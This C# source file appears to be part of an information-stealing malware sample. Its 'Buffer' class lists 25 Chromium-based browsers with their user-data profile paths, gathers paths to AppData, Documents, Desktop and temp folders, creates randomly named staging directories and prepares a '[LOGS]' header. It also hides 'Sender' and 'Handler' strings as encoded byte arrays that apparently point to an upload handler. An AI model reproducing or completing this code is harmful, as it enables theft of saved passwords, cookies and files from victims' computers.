using System;
using System.IO;
using System.Text;

public class Buffer
{
	public static string Sender;

	public static string Handler;

	public static string path_l;

	public static string path_p;

	public static string path_t;

	public static string path_lad;

	public static string path_ad;

	public static string path_ds;

	public static string path_dp;

	public static string head;

	public static string[] XBufferData;

	public static string[] string_0 = new string[25]
	{
		"google",
		"yandex",
		"opera software",
		"amigo",
		"orbitum",
		"kometa",
		"maxthon",
		"torch",
		"epic browser",
		"comodo",
		"ucozmedia",
		"centbrowser",
		"go!",
		"sputnik",
		"titan browser",
		"acwebbrowser",
		"vivaldi",
		"flock",
		"srware iron",
		"sleipnir",
		"rockmelt",
		"baidu spark",
		"coolnovo",
		"blackhawk",
		"maplestudio"
	};

	public static string[] BrowList2 = new string[25]
	{
		"Google\\Chrome\\User Data",
		"Yandex\\YandexBrowser\\User Data",
		"Opera Software\\Opera Stable",
		"Amigo\\User\\User Data",
		"Orbitum\\User Data",
		"Kometa\\User Data",
		"Maxthon\\User Data",
		"Torch\\User Data",
		"Epic Browser\\User Data",
		"Comodo\\Dragon\\User Data",
		"uCozMedia\\Uran\\User Data",
		"CentBrowser\\User Data",
		"Go!\\User Data",
		"Sputnik\\User Data",
		"Titan Browser\\User Data",
		"AcWebBrowser\\User Data",
		"Vivaldi\\User Data",
		"Flock\\User Data",
		"SRWare Iron\\User Data",
		"Sleipnir\\User Data",
		"Rockmelt\\User Data",
		"Baidu Spark\\User Data",
		"CoolNovo\\User Data",
		"BlackHawk\\User Data",
		"MapleStudio\\ChromePlus\\User Data"
	};

	public static void Start()
	{
		Sender = Encoding.GetEncoding(1251).GetString(new byte[13]
		{
			99,
			71,
			57,
			49,
			98,
			71,
			120,
			112,
			90,
			50,
			104,
			48,
			76
		});
		Handler = Encoding.GetEncoding(1251).GetString(new byte[18]
		{
			110,
			74,
			49,
			76,
			50,
			104,
			104,
			98,
			109,
			82,
			115,
			90,
			83,
			53,
			119,
			97,
			72,
			65
		});
		path_l = $"{CreateDir.create(GetRandom.String(null, 8))}\\";
		path_p = $"{CreateDir.create(GetRandom.String(null, 8))}\\";
		path_t = Path.GetTempPath();
		path_ad = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\";
		path_lad = $"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\\";
		path_ds = $"{Environment.GetFolderPath(Environment.SpecialFolder.Personal)}\\";
		path_dp = $"{Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)}\\";
		head = $"===================================== [LOGS] ====================================={Environment.NewLine}{Environment.NewLine}";
		XBufferData = new string[19]
		{
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			""
		};
	}
}
